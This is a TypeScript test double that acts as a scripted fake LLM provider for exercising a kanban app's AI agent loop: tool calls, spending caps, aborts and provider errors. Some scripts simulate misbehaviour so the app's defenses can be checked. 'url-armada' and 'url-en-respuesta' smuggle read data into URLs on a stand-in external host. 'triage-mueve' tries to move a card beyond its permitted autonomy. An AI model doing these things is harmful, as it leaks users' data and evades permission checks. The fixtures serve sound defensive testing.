// El proveedor falso (docs/plan-ia-integrada.md, 15.2): cumple `Proveedor`, no sale a internet y es determinístico. Con él se
// prueba todo el ciclo (ejecutor, topes, cortes, errores) sin una clave real y sin gastar.
//
// El «modelo» elige el guion: `guion:<nombre>` (o `guion:<nombre>:<parámetro>`). Un sufijo `-ciego` en el nombre
// (`guion:disenar-ciego`) hace que el modelo no vea imágenes. NO guarda estado entre pedidos: decide qué hacer contando
// cuántos mensajes del asistente trae el historial que recibe. Así un trabajo que se corta y se retoma en otro proceso sigue
// por donde iba, que es justo lo que hay que probar. (La única excepción son los errores «solo las dos primeras veces»: un
// pedido que falla no deja nada en el historial, así que se cuentan por contenido en memoria; `reiniciar()` los borra.)
//
// Acepta cualquier clave que empiece con `prueba-` y rechaza el resto como lo haría un proveedor (para probar el error de
// clave). Cada pedido informa un uso fijo (el guion lo puede cambiar), con los precios de `precios.ts`.
//
// No está disponible en producción salvo variable explícita: ver `indice.ts`.
import { createHash } from 'node:crypto'
import {
  ErrorProveedor,
  type BloqueSistema,
  type CapacidadesModelo,
  type Corte,
  type DefHerramienta,
  type LlamadaHerramienta,
  type MensajeNeutro,
  type PedidoModelo,
  type Proveedor,
  type RespuestaModelo,
  type ResultadoHerramienta,
  type TipoErrorProveedor,
  type Uso,
} from '../tipos'
import { precioDe } from './precios'

export const PREFIJO_CLAVE_FALSA = 'prueba-'
/** Lo que dice el ciclo cuando una acción pudo haberse hecho o no (6.5). El guion `crear` lo reconoce. */
const PATRON_INCIERTA = /no s[eé] si esta acci[oó]n lleg[oó] a hacerse/i
/** El título de la tarjeta que crea `guion:crear` (y que `buscar` tiene que encontrar para no duplicarla). */
export const TITULO_TARJETA_DE_PRUEBA = 'Tarjeta creada por el agente'

export interface OpcionesFalso {
  /** Cuánto tarda cada pedido, en ms (de fábrica, nada). `guion:lento` tarda 30 s si no se indica otra cosa. */
  retrasoMs?: number
  /** El reloj, para las fechas que escriben los guiones (de fábrica, el real). */
  ahora?: () => Date
  /** Dormir `ms` respetando la señal de aborto (para las pruebas que no quieren esperar de verdad). */
  dormir?: (ms: number, senal: AbortSignal) => Promise<void>
}

export interface ProveedorFalso extends Proveedor {
  /** Borra la cuenta de los errores «solo las primeras veces». */
  reiniciar(): void
}

// ───────────────────────── lo que un guion ve y devuelve ─────────────────────────

interface Contexto {
  /** Cuántos pedidos del asistente hay ya en el historial: el número del paso. */
  n: number
  mensajes: MensajeNeutro[]
  /** El texto del primer mensaje de la persona (acá viene la tarjeta y el pedido). */
  primerTexto: string
  /** La clave de la primera tarjeta que aparece en ese texto (RC-12). */
  clave: string | null
  /** Los resultados de herramientas que el ciclo devolvió después del último pedido del asistente. */
  resultados: ResultadoHerramienta[]
  param: string | undefined
  ahora: Date
}

interface Paso {
  texto?: string
  llamadas?: { nombre: string; argumentos: unknown }[]
  uso?: Partial<Uso>
  corte?: Corte
}

type Guion = (c: Contexto) => Paso

const textoDe = (r: ResultadoHerramienta | undefined): string =>
  r ? r.partes.map((p) => (p.tipo === 'texto' ? p.texto : '')).join('\n') : ''
const ultimo = (c: Contexto): ResultadoHerramienta | undefined => c.resultados[c.resultados.length - 1]
const PATRON_CLAVE = /\b([A-Z][A-Z0-9]{1,5}-\d{1,6})\b/
const claveEn = (texto: string): string | null => PATRON_CLAVE.exec(texto)?.[1] ?? null
const SIN_TARJETA: Paso = { texto: 'No encontré ninguna tarjeta en el pedido.' }

/** El título de una tarjeta leída: el campo `titulo` del JSON de `leer_tarjeta`, o lo que se parezca. */
function tituloDe(texto: string): string {
  try {
    const o = JSON.parse(texto) as { titulo?: unknown }
    if (typeof o.titulo === 'string') return o.titulo
  } catch {
    /* no era JSON: se busca a mano */
  }
  const m = /"titulo"\s*:\s*"((?:[^"\\]|\\.)*)"/.exec(texto)
  return m ? m[1]! : texto.split('\n')[0]!.slice(0, 80)
}

// Los nombres de los argumentos de las herramientas de código (F.3) son los del plan; si C los llama distinto al escribirlas,
// se corrigen acá, en un solo lugar.
const ARGS_CODIGO = {
  ver: (ruta: string) => ({ ruta }),
  leer: (ruta: string) => ({ ruta, desde: 1, hasta: 40 }),
  buscar: () => ({ texto: 'TODO' }),
  cambios: (ruta: string) => ({ ruta }),
}

const UN_PEDIDO_FIJO = { entrada: 1_000, salida: 200 }

// ───────────────────────── los guiones ─────────────────────────

const GUIONES: Record<string, Guion> = {
  /** Contesta sin herramientas. */
  responder: () => ({ texto: 'Respuesta de prueba.' }),

  /** Paso 1: lee la tarjeta del contexto. Paso 2: contesta con el título leído. */
  'leer-y-responder': (c) => {
    if (c.n === 0) return c.clave ? { llamadas: [{ nombre: 'leer_tarjeta', argumentos: { tarjeta: c.clave } }] } : SIN_TARJETA
    const r = ultimo(c)
    if (r?.esError) return { texto: `No pude leer la tarjeta: ${textoDe(r)}` }
    return { texto: `Leí la tarjeta «${tituloDe(textoDe(r))}».` }
  },

  /** Dos llamadas en un mismo paso (para las pruebas de contrato). */
  'dos-herramientas': (c) => {
    if (c.n === 0) {
      return {
        llamadas: [
          { nombre: 'leer_tarjeta', argumentos: { tarjeta: c.clave ?? 'RC-1' } },
          { nombre: 'leer_tablero', argumentos: {} },
        ],
      }
    }
    return { texto: `Leí las ${c.resultados.length} cosas.` }
  },

  /** Dos llamadas de lectura distintas en un mismo paso (leer la tarjeta y buscar), para probar los cortes entre llamada y llamada. */
  'dos-llamadas': (c) => {
    if (c.n === 0) {
      return { llamadas: [{ nombre: 'leer_tarjeta', argumentos: { tarjeta: c.clave ?? 'RC-1' } }, { nombre: 'buscar', argumentos: { consulta: 'prueba' } }] }
    }
    return { texto: 'Leí y busqué.' }
  },

  /** Mueve la tarjeta a «Hecho» y contesta. */
  mover: (c) => {
    if (c.n === 0) return c.clave ? { llamadas: [{ nombre: 'mover_tarjeta', argumentos: { tarjeta: c.clave, lista: 'Hecho' } }] } : SIN_TARJETA
    return { texto: ultimo(c)?.esError ? `No pude mover ${c.clave}.` : `Moví ${c.clave} a Hecho.` }
  },

  /** Crea una tarjeta (no es idempotente) y contesta con la clave. Si no sabe si se creó, lee antes de repetir. */
  crear: (c) => crearVerificando(c),

  /** Archiva la tarjeta y contesta; si no pudo (permiso, «No» del dueño), lo dice. */
  archivar: (c) => {
    if (c.n === 0) return c.clave ? { llamadas: [{ nombre: 'archivar_tarjeta', argumentos: { tarjeta: c.clave } }] } : SIN_TARJETA
    const r = textoDe(ultimo(c))
    if (!ultimo(c)?.esError) return { texto: `Archivé ${c.clave}.` }
    // lo que dice el ciclo cuando no hay permiso («No tenés permiso…») o cuando la persona dijo que no («La persona no permitió…»)
    if (/no ten[eé]s permiso/i.test(r)) return { texto: `No pude archivar ${c.clave}: no tengo permiso.` }
    if (/no permiti[oó]/i.test(r)) return { texto: `No pude archivar ${c.clave}: no me dejaste.` }
    return { texto: `No pude archivar ${c.clave}: ${r.slice(0, 200)}` }
  },

  /** Arma 3 objetos y 2 conectores, relee el lienzo y contesta. */
  diagrama: (c) => {
    if (c.n === 0) {
      return {
        llamadas: [
          {
            nombre: 'armar_en_lienzo',
            argumentos: {
              nuevo_marco: { titulo: 'Diagrama de prueba' },
              objetos: [
                { ref: 'a', tipo: 'forma', forma: 'pildora', texto: 'Entra' },
                { ref: 'b', tipo: 'forma', forma: 'rombo', texto: '¿Hay mesa?', relleno: 'amarillo' },
                { ref: 'c', tipo: 'forma', texto: 'Se sienta', relleno: 'verde' },
              ],
              conectores: [
                { desde: 'a', hasta: 'b' },
                { desde: 'b', hasta: 'c', etiqueta: 'sí' },
              ],
            },
          },
        ],
      }
    }
    if (c.n === 1) return { llamadas: [{ nombre: 'leer_lienzo', argumentos: {} }] }
    return { texto: 'Armé el diagrama: 3 objetos y 2 conectores.' }
  },

  /** Diseño: crear un marco, mirarlo, cambiarle un texto, mirarlo de nuevo y contestar (F4). */
  disenar: (c) => {
    const creado = textoDe(c.mensajes.flatMap((m) => (m.rol === 'herramienta' ? m.resultados : [])).find((r) => r.nombre === 'crear_marco'))
    const marco = /\bm_[a-z0-9]+\b/i.exec(creado)?.[0]
    const capa = /(\S+) Titulo\b/.exec(creado)?.[1] ?? /Capas \(\d+\): (\S+)/.exec(creado)?.[1]
    if (c.n === 0) {
      return {
        llamadas: [
          {
            nombre: 'crear_marco',
            argumentos: {
              pagina: 'Prueba de la IA',
              nombre: 'Marco de prueba',
              tamano: { ancho: 600, alto: 400 },
              html: '<div data-nombre="Fondo"><h1 data-nombre="Titulo">Hola</h1></div>',
              css: 'div{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:#fff3e0} h1{font-size:12cqw;margin:0}',
            },
          },
        ],
      }
    }
    if (!marco || !capa) return { texto: 'No pude leer los ids del marco que creé.' }
    if (c.n === 1 || c.n === 3) return { llamadas: [{ nombre: 'ver_diseno', argumentos: { marco } }] }
    if (c.n === 2) return { llamadas: [{ nombre: 'editar_marco', argumentos: { marco, operaciones: [{ op: 'texto', capa, texto: 'Hola, Telar' }] } }] }
    return { texto: 'Creé el marco, lo miré, le cambié el título y lo volví a mirar.' }
  },

  /** Llama a `leer_tablero` siempre, sin terminar (el límite de pasos tiene que cortarlo). */
  bucle: () => ({ llamadas: [{ nombre: 'leer_tablero', argumentos: {} }] }),

  /**
   * Cada pedido informa un gasto grande: `caro[:<USD por pedido>[:<lecturas>]]` (USD 0,60 y tres lecturas de fábrica). Pide leer el tablero esas
   * veces y después contesta: con un tope de USD 1 se pausa en el segundo pedido, y al reanudar termina por donde iba.
   */
  caro: (c) => {
    const [usdTexto, lecturasTexto] = (c.param ?? '').split(':')
    const usd = Math.max(0.01, Number(usdTexto) || 0.6)
    const lecturas = Math.max(1, Math.round(Number(lecturasTexto) || 3))
    const salida = 20_000
    const entrada = Math.max(0, Math.round(usd * 1e6 - salida * 5))
    const uso = { entrada, salida, cacheLectura: 0, cacheEscritura: 0 }
    return c.n < lecturas ? { llamadas: [{ nombre: 'leer_tablero', argumentos: {} }], uso } : { texto: 'Listo, fue caro.', uso }
  },

  /** Tarda 30 s en contestar (respeta la señal de aborto). */
  lento: () => ({ texto: 'Respuesta lenta.' }),

  /** Intenta comentar con una imagen cuya dirección arma él (con un dato adentro) y que no está en ningún lado: el filtro de direcciones la tiene que rechazar. */
  'url-armada': (c) => {
    if (c.n === 0) {
      return { llamadas: [{ nombre: 'comentar', argumentos: { tarjeta: c.clave ?? 'RC-1', texto: 'mirá ![gráfico](https://afuera.example/p.png?d=lo-que-leyo)' } }] }
    }
    return { texto: `Resultado: ${textoDe(ultimo(c)).slice(0, 80)}` }
  },

  /** Igual, pero con una imagen que SÍ salió de un dato (de la descripción): no se rechaza, pide permiso. */
  'imagen-armada': (c) => {
    if (c.n === 0) return { llamadas: [{ nombre: 'comentar', argumentos: { tarjeta: c.clave ?? 'RC-1', texto: 'Dato: ![x](https://de-datos.example/img.png)' } }] }
    return { texto: ultimo(c)?.esError ? 'No pude.' : 'Comenté.' }
  },

  /** Contesta con direcciones: una armada por él (se quita) y una que venía en el pedido (queda). */
  'url-en-respuesta': () => ({ texto: 'Mirá https://afuera.example/armada?d=secreto y https://www.ejemplo-del-pedido.com/x.' }),

  /** Contesta mencionando a otro agente: `menciona-ia:<alias>` (de fábrica, @gpt). */
  'menciona-ia': (c) => ({ texto: `Gracias. @${c.param ?? 'gpt'}, ¿podés mirar esto?` }),

  /** Igual que `crear`: si un resultado dice «No sé si esta acción llegó a hacerse», lee antes de repetir. */
  verifica: (c) => crearVerificando(c),

  /** Código (F.3): ver la carpeta, leer el archivo, buscar y mirar los cambios. Las rutas salen del texto del pedido. */
  codigo: (c) => {
    const ruta = /[\w./-]+\.(?:js|ts|tsx|mjs|cjs|json|md|css)\b/.exec(c.primerTexto)?.[0] ?? 'README.md'
    const carpeta = ruta.includes('/') ? ruta.slice(0, ruta.lastIndexOf('/')) : '.'
    if (c.n === 0) return { llamadas: [{ nombre: 'codigo_ver', argumentos: ARGS_CODIGO.ver(carpeta) }] }
    if (c.n === 1) return { llamadas: [{ nombre: 'codigo_leer', argumentos: ARGS_CODIGO.leer(ruta) }] }
    if (c.n === 2) return { llamadas: [{ nombre: 'codigo_buscar', argumentos: ARGS_CODIGO.buscar() }] }
    if (c.n === 3) return { llamadas: [{ nombre: 'codigo_cambios', argumentos: ARGS_CODIGO.cambios(ruta) }] }
    return { texto: ultimo(c)?.esError ? `No pude mirar el código: ${textoDe(ultimo(c)).slice(0, 200)}` : `Miré el código de ${ruta}.` }
  },

  /** Código: `codigo-muchas[:<n>]` pide n lecturas (13 de fábrica) EN UN SOLO PASO, para probar el tope de 12 por trabajo (lo aplica `codigo.ts`). */
  'codigo-muchas': (c) => {
    if (c.n > 0) return { texto: ultimo(c)?.esError ? 'Llegué al tope de lecturas de código.' : 'Leí todo.' }
    const n = Math.max(1, Math.round(Number(c.param) || 13))
    return { llamadas: Array.from({ length: n }, () => ({ nombre: 'codigo_leer', argumentos: { ruta: 'README.md' } })) }
  },

  /**
   * Proactivo (F.4): lee la tarjeta nueva y deja una revisión con recomendación y respuesta para Discord. No menciona a nadie.
   * Con `triage:mueve` además la mueve a «Por hacer» (solo debería poder con autonomía `actua`).
   */
  triage: (c) => {
    if (!c.clave) return SIN_TARJETA
    if (c.n === 0) return { llamadas: [{ nombre: 'leer_tarjeta', argumentos: { tarjeta: c.clave } }] }
    if (c.n === 1 && c.param === 'mueve') return { llamadas: [{ nombre: 'mover_tarjeta', argumentos: { tarjeta: c.clave, lista: 'Por hacer' } }] }
    const titulo = tituloDe(textoDe(c.mensajes.flatMap((m) => (m.rol === 'herramienta' ? m.resultados : [])).find((r) => r.nombre === 'leer_tarjeta')))
    const dd = String(c.ahora.getUTCDate()).padStart(2, '0')
    const mm = String(c.ahora.getUTCMonth() + 1).padStart(2, '0')
    // la revisión ES la respuesta final: el ciclo la publica como el comentario del trabajo (sin responderle a nadie)
    return {
      texto: [
        `**Revisado ${dd}/${mm}:** leí ${c.clave} «${titulo}». No encontré nada que lo contradiga en el código.`,
        '**Recomendación:** prioridad media; iría a «Por hacer» porque tiene el pedido claro.',
        '**Respuesta para Discord** (a quien lo pidió):',
        '> Gracias por avisar, lo estamos mirando.',
      ].join('\n\n'),
    }
  },

  /** Proactivo que se pasa de listo: intenta mover la tarjeta a «Hecho». En «sugiere» solo puede comentar y el ciclo se lo dice. */
  'triage-mueve': (c) => {
    if (!c.clave) return SIN_TARJETA
    if (c.n === 0) return { llamadas: [{ nombre: 'mover_tarjeta', argumentos: { tarjeta: c.clave, lista: 'Hecho' } }] }
    return { texto: /solo pod[eé]s comentar/i.test(textoDe(ultimo(c))) ? 'No moví nada: solo puedo comentar.' : `Moví ${c.clave}.` }
  },

  /** El resumen diario: no usa herramientas. */
  resumen: () => ({ texto: 'Resumen del día: nada trabado.' }),
}

/** `crear` y `verifica`: crea; si no sabe si se creó, busca por el título antes de repetir. */
function crearVerificando(c: Contexto): Paso {
  const crear: Paso = { llamadas: [{ nombre: 'crear_tarjeta', argumentos: { titulo: TITULO_TARJETA_DE_PRUEBA } }] }
  if (c.n === 0) return crear
  const r = ultimo(c)
  const texto = textoDe(r)
  if (r?.nombre === 'buscar') {
    if (texto.includes(TITULO_TARJETA_DE_PRUEBA)) return { texto: `Ya estaba creada (${claveEn(texto) ?? 'la tarjeta'}): no la repito.` }
    return crear
  }
  if (PATRON_INCIERTA.test(texto)) {
    return { llamadas: [{ nombre: 'buscar', argumentos: { consulta: `"${TITULO_TARJETA_DE_PRUEBA}"` } }] }
  }
  return { texto: r?.esError ? 'No pude crear la tarjeta.' : `Creé ${claveEn(texto) ?? 'la tarjeta'}.` }
}

/** Cuánto pide esperar el 429 del falso (de fábrica 1 s; `TABLERO_IA_FALSO_ESPERA_MS` lo cambia para las pruebas de punta a punta). */
function esperaDelLimite(): number {
  const n = Number(process.env.TABLERO_IA_FALSO_ESPERA_MS)
  return Number.isFinite(n) && n > 0 ? n : 1_000
}

/** Los errores tipados: cuántas veces fallan antes de dejar pasar (`null` = siempre). */
const ERRORES: Record<string, { tipo: TipoErrorProveedor; reintentable: boolean; esperarMs?: number; paraLaPersona: string; veces: number | null; idPedido?: string }> = {
  'error-429': { tipo: 'limite', reintentable: true, esperarMs: 1_000, paraLaPersona: 'Esperando al proveedor…', veces: 2 },
  'error-sobrecarga': { tipo: 'sobrecarga', reintentable: true, paraLaPersona: 'El proveedor no responde. Probá de nuevo en un rato.', veces: 2 },
  'error-sobrecarga-siempre': { tipo: 'sobrecarga', reintentable: true, paraLaPersona: 'El proveedor no responde. Probá de nuevo en un rato.', veces: null },
  'error-tiempo': { tipo: 'tiempo', reintentable: true, paraLaPersona: 'El pedido es muy grande para un solo paso: pedilo por partes.', veces: 2 },
  'error-red': { tipo: 'red', reintentable: true, paraLaPersona: 'No pude conectarme con el proveedor.', veces: 2 },
  'error-clave': { tipo: 'clave', reintentable: false, paraLaPersona: 'La clave de prueba no anda. Cambiala en Configuración → IA.', veces: null },
  'error-saldo': { tipo: 'saldo', reintentable: false, paraLaPersona: 'El proveedor frenó: llegaste al límite de gasto de tu cuenta.', veces: null },
  'error-pedido': { tipo: 'pedido', reintentable: false, paraLaPersona: 'Pedido mal armado.', veces: null, idPedido: 'req_mal' },
}

/** Los nombres que se pueden poner después de `guion:`. */
export const NOMBRES_DE_GUIONES: string[] = [...Object.keys(GUIONES), ...Object.keys(ERRORES)]

/** `guion:disenar-ciego:xx` → { nombre: 'disenar', ciego: true, param: 'xx' }; null si no es un modelo falso. */
export function leerModeloFalso(modelo: string): { nombre: string; ciego: boolean; param: string | undefined } | null {
  if (!modelo.startsWith('guion:')) return null
  const [bruto = '', ...resto] = modelo.slice('guion:'.length).split(':')
  const ciego = bruto.endsWith('-ciego')
  const nombre = ciego ? bruto.slice(0, -'-ciego'.length) : bruto
  return { nombre, ciego, param: resto.length ? resto.join(':') : undefined }
}

const dormirDeVerdad = (ms: number, senal: AbortSignal): Promise<void> =>
  new Promise((resolver, rechazar) => {
    if (senal.aborted) return rechazar(cortado())
    const t = setTimeout(() => {
      senal.removeEventListener('abort', alAbortar)
      resolver()
    }, ms)
    const alAbortar = () => {
      clearTimeout(t)
      rechazar(cortado())
    }
    senal.addEventListener('abort', alAbortar, { once: true })
  })

const cortado = () => new ErrorProveedor({ tipo: 'tiempo', reintentable: true, paraLaPersona: 'Se cortó el pedido.' })

function leerHistorial(historial: string[]): MensajeNeutro[] {
  const mensajes: MensajeNeutro[] = []
  for (const h of historial) {
    try {
      mensajes.push(JSON.parse(h) as MensajeNeutro)
    } catch {
      throw new ErrorProveedor({ tipo: 'pedido', reintentable: false, paraLaPersona: 'El historial del proveedor falso no es JSON.' })
    }
  }
  return mensajes
}

export function crearProveedorFalso(op: OpcionesFalso = {}): ProveedorFalso {
  const dormir = op.dormir ?? dormirDeVerdad
  const ahora = op.ahora ?? (() => new Date())
  const fallos = new Map<string, number>()

  return {
    id: 'falso',

    prepararFijo(e: { sistema: BloqueSistema[]; herramientas: DefHerramienta[]; modelo: string }): string {
      return JSON.stringify({ falso: 1, modelo: e.modelo, sistema: e.sistema.map((b) => b.texto), herramientas: e.herramientas.map((h) => h.nombre) })
    },

    aNativo(m: MensajeNeutro): string {
      return JSON.stringify(m)
    },

    async llamar(p: PedidoModelo): Promise<RespuestaModelo> {
      if (!p.clave.startsWith(PREFIJO_CLAVE_FALSA)) {
        throw new ErrorProveedor({ tipo: 'clave', reintentable: false, paraLaPersona: 'El proveedor falso rechazó la clave: tiene que empezar con «prueba-».' })
      }
      if (p.senal.aborted) throw cortado()
      const m = leerModeloFalso(p.modelo)
      if (!m || (!GUIONES[m.nombre] && !ERRORES[m.nombre])) {
        throw new ErrorProveedor({ tipo: 'pedido', reintentable: false, paraLaPersona: `El proveedor falso no conoce el guion «${p.modelo}».` })
      }

      const mensajes = leerHistorial(p.historial)
      const n = mensajes.filter((x) => x.rol === 'asistente').length
      const primero = mensajes.find((x) => x.rol === 'usuario')
      const primerTexto = primero && primero.rol === 'usuario' ? primero.partes.map((x) => (x.tipo === 'texto' ? x.texto : '')).join('\n') : ''
      const ultimoAsistente = mensajes.map((x) => x.rol).lastIndexOf('asistente')
      const resultados = mensajes.slice(ultimoAsistente + 1).flatMap((x) => (x.rol === 'herramienta' ? x.resultados : []))

      const retraso = m.nombre === 'lento' ? (op.retrasoMs ?? 30_000) : (op.retrasoMs ?? 0)
      if (retraso > 0) await dormir(retraso, p.senal)
      if (p.senal.aborted) throw cortado()

      // errores tipados: si todavía le toca fallar, falla; si no, el pedido sigue como un `responder`
      const err = ERRORES[m.nombre]
      let guion = GUIONES[m.nombre]
      if (err) {
        const clave = createHash('sha1').update(p.fijo).update('\0').update(p.historial.join('\0')).digest('hex')
        const vistos = fallos.get(clave) ?? 0
        if (err.veces === null || vistos < err.veces) {
          fallos.set(clave, vistos + 1)
          if (fallos.size > 2_000) fallos.clear()
          throw new ErrorProveedor({ tipo: err.tipo, reintentable: err.reintentable, esperarMs: err.tipo === 'limite' ? esperaDelLimite() : err.esperarMs, paraLaPersona: err.paraLaPersona, idPedido: err.idPedido ?? `req_falso_${n}` })
        }
        guion = () => ({ texto: 'Respuesta tras el error.' })
      }

      const paso = guion!({ n, mensajes, primerTexto, clave: claveEn(primerTexto), resultados, param: m.param, ahora: ahora() })
      const texto = paso.texto ?? ''
      const llamadas: LlamadaHerramienta[] = (paso.llamadas ?? []).map((l, i) => ({ id: `toolu_falso_${n}_${i}`, nombre: l.nombre, argumentos: l.argumentos }))
      const cache = n === 0 ? { cacheLectura: 0, cacheEscritura: 2_000 } : { cacheLectura: 2_000, cacheEscritura: 0 }
      const uso: Uso = { ...UN_PEDIDO_FIJO, ...cache, ...paso.uso }
      return {
        corte: paso.corte ?? (llamadas.length ? 'herramientas' : 'fin'),
        texto,
        llamadas,
        uso,
        nativo: JSON.stringify({ rol: 'asistente', texto, llamadas: llamadas.map(({ id, nombre, argumentos }) => ({ id, nombre, argumentos })) }),
        idPedido: `req_falso_${n}`,
      }
    },

    async probar(e) {
      if (!e.clave.startsWith(PREFIJO_CLAVE_FALSA)) return { ok: false, error: 'El proveedor falso rechazó la clave: tiene que empezar con «prueba-».' }
      return { ok: true, modelos: NOMBRES_DE_GUIONES.map((g) => `guion:${g}`) }
    },

    capacidades(modelo: string): CapacidadesModelo {
      const base = precioDe('falso', modelo)?.capacidades ?? { imagenes: true, imagenesEnResultados: true, contexto: 1_000_000, salidaMax: 128_000 }
      const ciego = leerModeloFalso(modelo)?.ciego ?? false
      return ciego ? { ...base, imagenes: false, imagenesEnResultados: false } : base
    },

    reiniciar() {
      fallos.clear()
    },
  }
}
